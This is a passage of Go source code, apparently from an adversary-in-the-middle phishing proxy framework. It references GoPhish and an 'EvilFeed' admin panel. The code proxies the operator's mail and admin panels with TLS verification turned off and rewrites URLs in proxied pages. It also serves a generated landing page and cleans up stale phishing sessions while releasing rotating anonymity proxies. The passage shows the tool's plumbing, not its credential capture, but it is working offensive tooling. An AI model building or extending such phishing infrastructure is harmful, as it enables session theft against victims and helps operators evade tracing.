	// Make the request with TLS skip verification for local backends
	// Note: Since GoPhish is now configured with use_tls=false, we use HTTP
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, // Allow self-signed certs if GoPhish uses HTTPS
		},
	}
	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
		// Don't follow redirects - let the browser handle them
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	proxyResp, err := client.Do(proxyReq)
	if err != nil {
		log.Error("[MailPanel] Proxy request failed: %v", err)
		resp := goproxy.NewResponse(req, "text/html", http.StatusBadGateway, "Mail panel unavailable")
		return req, resp
	}

	// Read response body
	body, _ := ioutil.ReadAll(proxyResp.Body)
	proxyResp.Body.Close()

	// Rewrite Location header for redirects
	if location := proxyResp.Header.Get("Location"); location != "" {
		// If it's an absolute path (starts with /), prepend the base path
		if strings.HasPrefix(location, "/") && !strings.HasPrefix(location, "//") {
			proxyResp.Header.Set("Location", basePath+location)
			log.Debug("[MailPanel] Rewrote redirect: %s -> %s", location, basePath+location)
		}
	}

	// Rewrite absolute URLs in HTML/JS/CSS responses to include the base path
	contentType := proxyResp.Header.Get("Content-Type")
	shouldRewrite := strings.Contains(contentType, "text/html") ||
		strings.Contains(contentType, "javascript") ||
		strings.Contains(contentType, "application/javascript") ||
		strings.Contains(contentType, "text/javascript") ||
		strings.Contains(contentType, "text/css") ||
		strings.Contains(contentType, "application/json")

	if shouldRewrite && len(body) > 0 {
		bodyStr := string(body)
		originalLen := len(bodyStr)

		// Rewrite absolute paths: href="/...", src="/...", action="/..."
		// But NOT protocol-relative URLs like href="//..." or data-* attributes
		re1 := regexp.MustCompile(`(href|src|action)="(/[^/"][^"]*)"`)
		bodyStr = re1.ReplaceAllString(bodyStr, `$1="`+basePath+`$2"`)
		re2 := regexp.MustCompile(`(href|src|action)='(/[^/'][^']*)'`)
		bodyStr = re2.ReplaceAllString(bodyStr, `$1='`+basePath+`$2'`)

		// Rewrite data attributes
		if !strings.Contains(bodyStr, basePath) || strings.Count(bodyStr, basePath) < 5 {
			re9 := regexp.MustCompile(`(data-[a-z-]+)="(/[^"]+)"`)
			bodyStr = re9.ReplaceAllString(bodyStr, `$1="`+basePath+`$2"`)
		}

		// Rewrite fetch/ajax calls
		re3 := regexp.MustCompile(`fetch\(['"](/[^'"]+)['"]\)`)
		bodyStr = re3.ReplaceAllString(bodyStr, `fetch('`+basePath+`$1')`)
		re4 := regexp.MustCompile(`fetch\(['"](/[^'"]+)['"],`)
		bodyStr = re4.ReplaceAllString(bodyStr, `fetch('`+basePath+`$1',`)

		// Rewrite $.ajax and $.get/$.post URLs
		re5 := regexp.MustCompile(`\$\.(ajax|get|post)\(['"](/[^'"]+)['"]`)
		bodyStr = re5.ReplaceAllString(bodyStr, `$.$1('`+basePath+`$2'`)

		// Rewrite url: "/..." in JavaScript objects
		re6 := regexp.MustCompile(`url:\s*['"](/[^'"]+)['"]`)
		bodyStr = re6.ReplaceAllString(bodyStr, `url: '`+basePath+`$1'`)

		// Rewrite url() in CSS: url(/...) or url('/...') or url("/...")
		re7 := regexp.MustCompile(`url\(["']?(/[^)"']+)["']?\)`)
		bodyStr = re7.ReplaceAllString(bodyStr, `url('`+basePath+`$1')`)

		// Rewrite window.location paths
		re8 := regexp.MustCompile(`(window\.location\s*=\s*|location\.href\s*=\s*)['"](/[^'"]+)['"]`)
		bodyStr = re8.ReplaceAllString(bodyStr, `$1'`+basePath+`$2'`)

		body = []byte(bodyStr)

		if len(bodyStr) != originalLen {
			log.Debug("[MailPanel] Rewrote response body: %d -> %d bytes", originalLen, len(bodyStr))
		}
	}

	// Create response
	resp := goproxy.NewResponse(req, contentType, proxyResp.StatusCode, string(body))
	if resp != nil {
		// Copy response headers (except Content-Length which may have changed)
		for key, values := range proxyResp.Header {
			if key != "Content-Length" {
				for _, value := range values {
					resp.Header.Add(key, value)
				}
			}
		}
	}

	return req, resp
}

// handleWebSocketProxy handles WebSocket upgrade requests by returning a 101 Switching Protocols response
// that instructs the client to connect directly to the backend WebSocket server
// Note: goproxy doesn't support true WebSocket proxying, so we redirect the client
func (p *HttpProxy) handleWebSocketProxy(req *http.Request, backendURL string, targetPath string) (*http.Request, *http.Response) {
	// For WebSocket connections through goproxy, we can't do true proxying
	// The best approach is to let the client know the WebSocket endpoint
	// Since the client already constructs the correct URL with base path,
	// and EvilFeed listens on the same path, we need to ensure the backend
	// WebSocket server is accessible

	// Reduced logging to avoid spam in terminal
	// WebSocket connections are handled by the client directly

	// Return a 502 Bad Gateway with a message - the client-side JavaScript
	// in EvilFeed already handles reconnection and constructs the correct URL
	// The actual WebSocket connection will be handled by EvilFeed directly
	// when accessed via the correct port

	// For now, return an error response - the client will retry
	// In a production setup, you'd want to use a proper WebSocket proxy library
	resp := goproxy.NewResponse(req, "text/plain", http.StatusBadGateway,
		"WebSocket connections should be made directly to the backend service")
	return req, resp
}

// handleAdminPanelImages proxies /images/ requests to EvilFeed for shared assets
// This allows the EvilFeed login page to load background images when accessed via /admin/
func (p *HttpProxy) handleAdminPanelImages(req *http.Request) (*http.Request, *http.Response) {
	// Get EvilFeed backend URL
	evilFeedEndpoint := p.cfg.GetAdminPanelConfig().AdminBackend
	if evilFeedEndpoint == "" {
		evilFeedEndpoint = "http://127.0.0.1:1337"
	}

	// Proxy the /images/ request directly to EvilFeed
	targetURL := evilFeedEndpoint + req.URL.Path
	if req.URL.RawQuery != "" {
		targetURL += "?" + req.URL.RawQuery
	}

	log.Debug("[AdminPanelImages] Proxying %s -> %s", req.URL.Path, targetURL)

	// Create proxy request
	proxyReq, err := http.NewRequest(req.Method, targetURL, req.Body)
	if err != nil {
		log.Error("[AdminPanelImages] Failed to create proxy request: %v", err)
		resp := goproxy.NewResponse(req, "text/plain", http.StatusBadGateway, "Image unavailable")
		return req, resp
	}

	// Copy headers
	for key, values := range req.Header {
		for _, value := range values {
			proxyReq.Header.Add(key, value)
		}
	}

	// Make the request
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
	}
	proxyResp, err := client.Do(proxyReq)
	if err != nil {
		log.Error("[AdminPanelImages] Proxy request failed: %v", err)
		resp := goproxy.NewResponse(req, "text/plain", http.StatusBadGateway, "Image unavailable")
		return req, resp
	}

	// Read response body
	body, _ := ioutil.ReadAll(proxyResp.Body)
	proxyResp.Body.Close()

	// Get content type
	contentType := proxyResp.Header.Get("Content-Type")
	if contentType == "" {
		contentType = http.DetectContentType(body)
	}

	// Create response
	resp := goproxy.NewResponse(req, contentType, proxyResp.StatusCode, "")
	if resp != nil {
		resp.Body = io.NopCloser(bytes.NewReader(body))
		// Copy response headers
		for key, values := range proxyResp.Header {
			if key != "Content-Length" {
				for _, value := range values {
					resp.Header.Add(key, value)
				}
			}
		}
		// Add caching for images
		resp.Header.Set("Cache-Control", "public, max-age=86400")
	}

	return req, resp
}

// handleAdminPanelAsset proxies generic asset requests (like notify.mp3) to EvilFeed
// This allows EvilFeed to load assets like notification sounds when accessed via /admin/
func (p *HttpProxy) handleAdminPanelAsset(req *http.Request) (*http.Request, *http.Response) {
	// Get EvilFeed backend URL
	evilFeedEndpoint := p.cfg.GetAdminPanelConfig().AdminBackend
	if evilFeedEndpoint == "" {
		evilFeedEndpoint = "http://127.0.0.1:1337"
	}

	// Proxy the request directly to EvilFeed
	targetURL := evilFeedEndpoint + req.URL.Path
	if req.URL.RawQuery != "" {
		targetURL += "?" + req.URL.RawQuery
	}

	log.Debug("[AdminPanelAsset] Proxying %s -> %s", req.URL.Path, targetURL)

	// Create proxy request
	proxyReq, err := http.NewRequest(req.Method, targetURL, req.Body)
	if err != nil {
		log.Error("[AdminPanelAsset] Failed to create proxy request: %v", err)
		resp := goproxy.NewResponse(req, "text/plain", http.StatusBadGateway, "Asset unavailable")
		return req, resp
	}

	// Copy headers
	for key, values := range req.Header {
		for _, value := range values {
			proxyReq.Header.Add(key, value)
		}
	}

	// Make the request
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
	}
	proxyResp, err := client.Do(proxyReq)
	if err != nil {
		log.Error("[AdminPanelAsset] Proxy request failed: %v", err)
		resp := goproxy.NewResponse(req, "text/plain", http.StatusBadGateway, "Asset unavailable")
		return req, resp
	}

	// Read response body
	body, _ := ioutil.ReadAll(proxyResp.Body)
	proxyResp.Body.Close()

	// Get content type
	contentType := proxyResp.Header.Get("Content-Type")
	if contentType == "" {
		contentType = http.DetectContentType(body)
	}

	// Create response
	resp := goproxy.NewResponse(req, contentType, proxyResp.StatusCode, "")
	if resp != nil {
		resp.Body = io.NopCloser(bytes.NewReader(body))
		// Copy response headers
		for key, values := range proxyResp.Header {
			if key != "Content-Length" {
				for _, value := range values {
					resp.Header.Add(key, value)
				}
			}
		}
		// Add caching for assets
		resp.Header.Set("Cache-Control", "public, max-age=86400")
	}

	return req, resp
}

// handleLandingPage serves the dynamic landing page for base domain
func (p *HttpProxy) handleLandingPage(req *http.Request) (*http.Request, *http.Response) {
	// Generate dynamic landing page
	generator := NewLandingPageGenerator(p.cfg)
	html := generator.GenerateLandingPage(req)

	resp := goproxy.NewResponse(req, "text/html; charset=utf-8", http.StatusOK, html)
	if resp != nil {
		// Add caching headers for better performance
		resp.Header.Set("Cache-Control", "public, max-age=3600")
		resp.Header.Set("X-Content-Type-Options", "nosniff")
		resp.Header.Set("X-Frame-Options", "SAMEORIGIN")
	}

	log.Debug("[LandingPage] Served dynamic landing page for %s", req.Host)
	return req, resp
}

// startSessionJanitor periodically cleans up stale sessions and releases their proxies
// This prevents proxy pool exhaustion from abandoned sessions
func (p *HttpProxy) startSessionJanitor() {
	log.Debug("[SessionJanitor] Started - cleaning stale sessions every 5 minutes")

	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		p.cleanupStaleSessions()
	}
}

// cleanupStaleSessions removes sessions that have been inactive for too long
// and releases their assigned proxies back to the pool
func (p *HttpProxy) cleanupStaleSessions() {
	p.session_mtx.Lock()
	defer p.session_mtx.Unlock()

	staleThreshold := 30 * time.Minute // Sessions inactive for 30+ minutes are considered stale
	now := time.Now()
	staleCount := 0

	for sid, session := range p.sessions {
		// Check if session is done and has been inactive
		if session.IsDone {
			// Session is complete - check if it's been a while since completion
			// We keep completed sessions for a bit to allow final data collection
			sessionAge := now.Sub(session.CreateTime)
			if sessionAge > 10*time.Minute {
				// Release proxy if assigned
				if session.AssignedProxy != nil && session.AssignedProxy.Host != "" && p.anonymityEngine != nil && p.anonymityEngine.proxyRotator != nil {
					p.anonymityEngine.proxyRotator.ReleaseProxy(session.AssignedProxy.Host, session.AssignedProxy.Port)
					log.Debug("[SessionJanitor] Released proxy %s:%d from completed session %s", session.AssignedProxy.Host, session.AssignedProxy.Port, sid)
				}
				delete(p.sessions, sid)
				delete(p.sids, sid)
				staleCount++
			}
		} else {
			// Session not done - check for staleness based on session age
			sessionAge := now.Sub(session.CreateTime)
			if sessionAge > staleThreshold {
				// Release proxy if assigned
				if session.AssignedProxy != nil && session.AssignedProxy.Host != "" && p.anonymityEngine != nil && p.anonymityEngine.proxyRotator != nil {
					p.anonymityEngine.proxyRotator.ReleaseProxy(session.AssignedProxy.Host, session.AssignedProxy.Port)
					log.Debug("[SessionJanitor] Released proxy %s:%d from stale session %s", session.AssignedProxy.Host, session.AssignedProxy.Port, sid)
				}
				delete(p.sessions, sid)
				delete(p.sids, sid)
				staleCount++
			}
		}
	}

	if staleCount > 0 {
		log.Info("[SessionJanitor] Cleaned up %d stale sessions", staleCount)
	}
}
